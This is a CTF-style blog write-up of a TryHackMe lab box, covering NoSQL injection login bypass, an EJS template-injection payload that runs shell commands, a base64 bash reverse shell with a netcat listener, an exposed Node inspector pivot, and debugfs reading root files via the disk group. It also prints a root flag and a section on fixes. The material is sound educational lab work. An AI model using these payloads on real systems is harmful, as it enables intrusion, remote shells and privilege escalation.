---
layout: post
title: "THM: Do Not Disturb"
date: 2026-08-02 19:45:00
category: "Web Exploitation"
difficulty: "Medium"
tags: [thm, hacker-holidays, boot2root, nosql-injection, ssti, ejs, rce, node-inspector, privilege-escalation, disk-group]
excerpt: "My most complete box yet, a four-technique chain: a NoSQL injection to bypass the login, EJS server-side template injection for code execution, an exposed Node --inspect debug port to pivot users, and finally the disk group plus debugfs to read the root flag straight off the raw partition. The user flag came fast. Root felt like a hard box, and that gap is the whole story."
---

<figure class="figure-narrow">
  <img src="{{ '/assets/img/do-not-disturb-briefing.png' | relative_url }}" alt="TryHackMe room page: Concierge Briefing for Do Not Disturb. Category Boot2Root, difficulty Medium, 90 points. Sign's on the door, room's active, you have access you were never given, and so does he. The anomalies stop being anomalies: a session goes warm on a sunbed and a stranger sits down in it, a wallet signs a transaction its owner didn't authorise, a shell on the beach answers back. The Byte Lotus poolside platform tracks every cabana, every sunbed, every warm session. Someone is already inside, follow his footprints in, climb the way he climbed, and recover both flags. Itinerary: find the user flag and the root flag.">
  <figcaption>The briefing for Do Not Disturb. "Follow his footprints in, climb the way he climbed" is the four-step chain written as flavour, one technique per user, a login bypass all the way up to root.</figcaption>
</figure>

This is the most complete box I've done so far, four separate techniques stacked
into one chain, and it's the first time a room genuinely felt like it had a beginner
half and an expert half bolted together. The user flag came quick. The privesc made
me feel like I was staring at a much harder box than the Medium rating suggested. I
want to be honest about that gap, because I think it's the real lesson here, more than
any single payload.

It's part of TryHackMe's Hacker Holidays 2026 event, same Byte Lotus universe as the
other rooms, this time a poolside cabana booking platform. The briefing does its usual
thing of hiding the vulnerability in holiday language: "a session goes warm, a wallet
signs a transaction its owner didn't authorise, follow his footprints, climb the way
he climbed." That last line turned out to be almost literal. This is a four-step climb,
and each step is a different user. Standard disclaimer, this is a deliberately
vulnerable lab built to be broken for practice, nothing here is a real service.

<figure class="figure-narrow">
  <img src="{{ '/assets/img/do-not-disturb-comic.png' | relative_url }}" alt="Event comic titled 02 Drift: things are not fine, several things are actively wrong, everyone is still acting like things are fine. A hooded Bitcoin-themed character notices their wallet balance looks different and sees a CryptoCabana Wallet transaction of minus 3.4 BTC marked confirmed that they did not authorise while they were at the buffet. A grey hooded figure with a laptop says it will pull the authentication logs, then concludes this isn't one compromised wallet and whoever is already inside has been moving for far longer than you have.">
  <figcaption>The event comic for this chapter, "Drift." The whole thing is a metaphor for the box: a warm session someone else sits down in (the login bypass), a transaction the owner didn't authorise (running as a user you shouldn't be), and an attacker who's already inside and has been moving between accounts. Pull the logs, follow the footprints, climb the same way.</figcaption>
</figure>

*One note before you read on. A few of the exact payloads below are hidden behind grey
bars like <span class="spoiler">this</span>. Click them (or tab to them and press
Enter) to reveal. The idea is you get the methodology and the reasoning first, and you
get a shot at working out the actual command yourself before you peek. Hints, not
answers off the rip. The recon and the standard commands are all shown normally, it's
only the "here's the exact string that pops it" lines that are covered.*

## Enumeration

Full scan first, as always:

```bash
sudo nmap -sC -sV -A <TARGET_IP>
```

Two ports:

```
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp open  http  Node.js (Express middleware)
```

The port 80 banner is the whole opening move. `Node.js (Express middleware)` tells me
this is a Node/Express app, not PHP, not Python. That one fact shapes everything I look
for later: the injection styles, the template engine, the privesc. Match the vuln to
the stack, that lesson keeps paying out.

SSH I filed away, no creds. On to directory busting:

```bash
gobuster dir -u http://<TARGET_IP> \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html
```

The interesting hit:

```
/logout   (Status: 302) [--> /]
/staff    (Status: 403) [Size: 1547]
```

A **403 on `/staff`**. That's the target painted on the wall. There's a staff area I'm
not allowed into, and the front page is just a login form. So the job is clear: become
staff.

## Step 1: NoSQL injection to bypass the login

<figure>
  <img src="{{ '/assets/img/do-not-disturb-login.png' | relative_url }}" alt="The Byte Lotus Poolside login page. A cream and teal themed form headed 'Byte Lotus, reserve a cabana, claim a sunbed, the pool remembers your usual.' Two fields, 'Staff / Guest ID' pre-filled with the placeholder text 'attendant', and an empty 'Passphrase' field, with a teal Sign in button. Footer reads 'Byte Lotus never forgets, Stay Noticed'.">
  <figcaption>The only door in: the poolside login. Notice the ID field's placeholder is literally "attendant," the staff account. That's the username I fed the NoSQL injection, the passphrase is the part I never needed to know.</figcaption>
</figure>

The login form on the homepage posts a username and password. My instinct these days is
to figure out what's behind it before I throw anything at it. Node app, login that
checks a username and password pair, that pattern very often means a MongoDB-style
document store, and those are famously vulnerable to NoSQL injection when the developer
passes user input straight into the query.

The trick with NoSQL injection is that the query is an object, not a string. A normal
login does something like "find one record where username equals X and password equals
Y." But if the app builds that query out of your raw input, you can smuggle in an
**operator** instead of a value. Express's body parser has a quirk that makes this easy:
if you send `password[$ne]=null` as form data, Express doesn't give the app the string
`"null"`, it builds a nested object `{ password: { $ne: null } }`. And `$ne` means "not
equal." So the query silently turns into "find a user whose password is not equal to
null," which is every user with a password. You've replaced "the password must match"
with "the password just has to exist."

I confirmed the exact request in Burp Repeater. The body that logged me straight in as
the staff user:

<span class="spoiler"><code>username=attendant&amp;password[$ne]=null</code></span>

That came back with a 302 redirect to `/staff` and a session cookie. Worth flagging one
thing I got wrong in my head at first: the briefing's "a wallet signs a transaction its
owner didn't authorise" made me expect a JWT, some signed token I'd have to forge. It
isn't. It's a plain Express server-side session (`connect.sid`), the signing talk was
just theme. Don't let the flavour text send you chasing a technique that isn't there.

One detail I only understood after reading the app source later (it's world-readable
once you're on the box): the `attendant` account's password is generated with
`crypto.randomBytes(18)` on every boot. It's random and different each time the box
starts. So brute force was never going to work, the injection was the *only* door.
That's a nice bit of design, it forces you to learn the actual bug.

## Step 2: EJS server-side template injection to RCE

Inside `/staff` there's a "confirmation message" feature. You type a template, it renders
a preview with your name filled in. The label literally says it uses EJS and to use
`<%= guest %>` to personalise the message. So the app is taking my input and feeding it
to a template engine. That's the setup for server-side template injection.

SSTI is what happens when user input is treated as template code instead of template
data. If I'm supposed to type `<%= guest %>` and it evaluates that, what happens if I
type an expression? I started with the classic harmless probe:

```
<%= 7*7 %>
```

The preview came back as `49`. Not the text `7*7`, the *result* `49`. That means my input
is being evaluated as EJS, and EJS expressions are just JavaScript. From "it runs my
JavaScript" to "it runs my system commands" is one step in Node, because I can reach into
`child_process` and call out to the shell. The payload that ran `id`:

<span class="spoiler"><code>&lt;%= process.mainModule.require('child_process').execSync('id').toString() %&gt;</code></span>

(One gotcha you'll hit here and again later: a bare `require` isn't always in scope, so
`process.mainModule.require` is the reliable way to get at it.) The preview printed the
output of `id`, running as the user **poolside** (uid 996). That's real code execution.

The user flag was actually reachable from right here without even getting a shell, since
I could run any command through the preview. `cat /home/*/user.txt` through the same
payload printed it:

```bash
cat /home/*/user.txt
# THM{[redacted]}
```

Redacted as always, the path is the point. But a preview box is an awful place to work,
so I used the same SSTI to fire a proper reverse shell. Same technique as I've used
before, base64-wrap a bash reverse shell so the quotes and redirects survive the trip
through the parser, then decode and run it on the target:

```bash
echo -n 'bash -i >& /dev/tcp/<TUN0_IP>/4444 0>&1' | base64
# feed <BASE64> into: echo <BASE64> | base64 -d | bash   (via the SSTI payload)
```

Listener on my side:

```bash
nc -lvnp 4444
```

Caught the shell as poolside, upgraded it to a real TTY with the usual
`python3 -c 'import pty; pty.spawn("/bin/bash")'` then `stty raw -echo; fg` dance, and
started enumerating properly.

## Step 3: pivot to pipelinesvc through an exposed Node inspector

Landing as `poolside`, `sudo -l` gave me nothing (it wanted a password I didn't have).
So this is the enumeration grind, and this is where the box stops being friendly. There's
no login form telling you where to look, no 403 painting a target. You just have to know
what to check. I did it by hand this time, which is good practice, but I'll say up front
that a tool like linpeas would have surfaced the next vector automatically. Doing it
manually is how it becomes yours, though.

Poking around `/home` showed a second non-root user, **pipelinesvc**, with a home
directory I couldn't read. So there's somewhere to pivot to. Looking at what
pipelinesvc actually owns and runs:

```bash
find / -user pipelinesvc 2>/dev/null | grep -v /proc
systemctl cat lotus-telemetry.service
```

That service definition is the whole vulnerability, sitting in plain text:

```
User=pipelinesvc
ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

The `--inspect` flag starts Node's debugging inspector. It's a wonderful development
tool and a catastrophe in production, because anyone who can reach that port can attach a
debugger to the running process and execute arbitrary JavaScript **inside it**, which
means as whatever user the process runs as. Here that's pipelinesvc, and the port is
9229 on localhost. I'm already on localhost. I confirmed it was listening and that it
was really a Node inspector:

```bash
ss -tlnp | grep 9229
curl -s http://127.0.0.1:9229/json
```

The JSON came back describing a live `node` debug target for `processor.js`. Then I just
attached to it with Node's own client:

```bash
node inspect 127.0.0.1:9229
```

At the `debug>` prompt you can run code in the target's context with `exec`. This is where
the `require` gotcha bit me first, `exec require(...)` threw `ReferenceError: require is
not defined`. The version that worked, reaching `require` through `process.mainModule`:

<span class="spoiler"><code>exec process.mainModule.require('child_process').execSync('id').toString()</code></span>

That printed:

```
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

Two things in that one line. I'm now executing as pipelinesvc, and, more importantly,
pipelinesvc is in the **`disk`** group. Hold that thought, it's the whole endgame. I used
the same `exec` to fire a second reverse shell (to a new port, with a fresh listener) so I
had a comfortable pipelinesvc shell to work from.

## Step 4: root via the disk group and debugfs

The `disk` group looks harmless. It is not. Being in the `disk` group grants read (and
write) access to the raw block devices, the actual disk, underneath the filesystem. And
file permissions live *inside* the filesystem. If you can read the raw device, you can
read every byte on it, including files you have no permission to open the normal way,
like `/root/root.txt`. The permission check never happens because you're going around
the filesystem entirely. As the flag ends up telling you, raw disk access is too much to
hand out.

The tool for this is `debugfs`, an ext filesystem debugger that'll happily open a block
device and let you cat files out of it. The only fiddly part is pointing it at the right
device, and this is where I flailed for a bit, so here's the honest version. I first
guessed `/dev/sda1` (nothing there, wrong name on this VM) and then `/dev/root` (permission
denied, because that symlink is `brw-------`, root only). What I should have done from the
start is just ask the system what the root filesystem actually sits on:

```bash
mount | grep ' / '
# /dev/nvme0n1p1 on / type ext4 (rw,relatime,discard)
ls -la /dev/nvme0n1p1
# brw-rw---- 1 root disk 259, 2 ... /dev/nvme0n1p1
```

There it is. The real partition is `/dev/nvme0n1p1`, and crucially its group is `disk`
with group read/write (`brw-rw----`). I'm in the `disk` group. So I can open it. The
command that read the root flag straight off the raw disk, no root, no password, no
opening the file the normal way:

<span class="spoiler"><code>debugfs -R "cat /root/root.txt" /dev/nvme0n1p1</code></span>

And out came the flag:

<span class="spoiler"><code>THM{r4w_d1sk_4cc3ss_w4s_t00_much}</code></span>

I'm leaving that one readable-on-click because the flag itself is the punchline. The same
trick would read `/root/.ssh/id_rsa` for a full interactive root shell if I wanted to go
further, but the flag was the objective.

## The honest bit: why the user was easy and root was hard

This is the part I actually want to write down. The user flag took me a fraction of the
time the root did, and I don't think that's a coincidence, I think it's how these boxes
are shaped, and it's worth understanding as a beginner.

Web exploitation is pattern-rich and, more importantly, feedback-rich. I type `7*7`, I
see `49`, I *know* I'm on the right track and I iterate from there. NoSQL injection and
SSTI both give you a response to every probe. You're in a conversation with the app.
That tight loop of "try, observe, adjust" is exactly what makes web stuff approachable
for a beginner, you're never flying blind for long.

Privesc has none of that. There's no prompt asking you a question, no error nudging you
toward the answer. It's `find` this, `cat` that, read a service file, and *recognise* that
`--inspect` on a service or membership of the `disk` group is a way in. Those two vectors
are pure prior knowledge: you either know that an exposed Node inspector is code execution
as that user, and that the disk group plus debugfs is a filesystem-permission bypass, or
you don't, and no amount of poking the box will draw it out of you the way SSTI draws out
`49`. That's why the same box can feel Easy at the top and hard at the bottom. The
difficulty of these machines lives in the privesc, and the privesc rewards reading and
remembering more than it rewards clever payloads.

Which is the actual takeaway, the reason I'm forcing myself to go read up on both of
those techniques properly rather than just banking the flag: the transferable skill from
this room isn't "type this string," it's carrying "exposed --inspect = RCE as that user"
and "disk group = read any file via debugfs" in my head for the next box, where nothing
will announce them.

## How to actually fix this box

Every bug here is a real-world one, so it's worth stating the fixes plainly:

- **NoSQL injection:** never build a query straight from user input objects. Cast the
  password to a string, or validate types, so `password` can only ever be a value and
  never an operator like `$ne`. The mistake is trusting the shape of the input, not just
  its contents.
- **SSTI:** don't render user-controlled templates. If users need to customise a message,
  give them fixed placeholders you fill in, never a live template engine pointed at their
  input.
- **Exposed Node inspector:** never run a production service with `--inspect`. That flag
  is for local debugging only. Even bound to localhost it's game over for anyone who gets
  a foothold on the host.
- **The disk group:** treat membership of `disk` as equivalent to root, because it is. A
  service account has no business being in it.

## What I took away

- **The banner is a finding.** `Node.js (Express middleware)` set my whole plan: NoSQL
  injection, EJS template injection, Node-specific privesc. Read the stack first.
- **NoSQL injection is an operator smuggled in as a value.** `password[$ne]=null` turns
  "password must match" into "password must exist." Send objects, not strings.
- **SSTI: prove it with `7*7` before you weaponise it.** `49` in the output is your green
  light, then reach `child_process` for RCE.
- **`--inspect` on a service is RCE as that user**, and `process.mainModule.require` is how
  you get at modules when a bare `require` is out of scope.
- **The `disk` group is root in disguise.** Raw block-device access plus `debugfs` reads
  any file on the box, permissions be damned. Point it at the real partition, find that
  with `mount | grep ' / '`, not by guessing device names.
- **Difficulty lives in the privesc.** The web half talks back to you, the privesc half
  makes you already know the answer. Go and learn the vectors, don't just collect them.

> Room: Do Not Disturb on TryHackMe (Hacker Holidays 2026), Boot2Root, Medium, 90 points.
> Four techniques, four users, one clean climb from a login bypass all the way to reading
> root off the raw disk. Flags left out (bar the one that's its own punchline, and even
> that one you have to click).
